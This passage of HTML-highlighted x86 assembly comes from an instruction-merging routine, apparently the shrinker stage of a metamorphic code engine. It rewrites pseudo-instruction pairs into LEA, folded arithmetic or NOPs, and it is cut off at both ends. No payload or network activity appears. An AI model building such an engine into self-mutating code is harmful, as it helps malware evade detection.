                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next07</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">   </span><span class="sc1">; MOV Reg,0+MOV Reg8,Mem8=MOVZX Reg,Mem8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Double_Next07</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">    </span><span class="sc1">; MOV Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next08</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; MOV Reg,Reg + ADD Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next07_LEA01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; MOV Reg,Reg + ADD Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next08</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next08</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; MOV Reg,Reg2 + ADD Reg,Reg3 =</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">       </span><span class="sc1">; = LEA Reg,[Reg2+Reg3]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next07_LEA01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next08</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; MOV Reg,Reg2 + ADD Reg,Imm =</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; = LEA Reg,[Reg2+Imm]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next06_SetLEA</span><span class="sc0">

      </span><span class="sc5">@@Double_Next08</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; ADD Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next09</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; ADD Reg,Imm + ADD Reg,Reg2?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next09</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next09</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">     </span><span class="sc1">; Merge to LEA</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Double_Next09</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; ADD Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next10</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; ADD Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next10</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next10</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">     </span><span class="sc1">; Merge to LEA</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Double_Next10</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">      </span><span class="sc1">; Generic OP?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next11</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">      </span><span class="sc1">; Generic OP + Generic OP?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next11</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; OP Mem,Imm + Generic OP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next10_OPMemImm</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; OP Reg,Imm + Generic OP?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next11</span><span class="sc0">
        </span><span class="sc5">@@Double_Next10_OPRegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; OP Reg,Imm + OP Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next11</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; 1st Reg == 2nd Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next11</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_CalculateOperation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_CalculateOperation_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">      </span><span class="sc1">; Get 2nd OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">      </span><span class="sc1">; Get 1st OP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CalculateOperation</span><span class="sc0"> </span><span class="sc1">; Merge the operations</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">     </span><span class="sc1">; Can be merged?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_End</span><span class="sc0">    </span><span class="sc1">; If not, check triplet</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; OP Reg,Imm + MOV Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next_SetNOPAt1st</span><span class="sc0"> </span><span class="sc1">; Then, eliminate first</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Set merged operation</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_SetNOPAt1st</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; Set NOP at first instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0"> </span><span class="sc1">; Return with success</span><span class="sc0">
        </span><span class="sc5">@@Double_Next10_OPMemImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; OP Mem,Imm + OP Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next11</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Are mem operands the same?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next11</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next11</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; If so, jump to try merging OPs</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_CalculateOperation</span><span class="sc0">

      </span><span class="sc5">@@Double_Next11</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Do the same as above, but with</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">; 8 bits operations</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Double_Next12</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Double_Next12</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
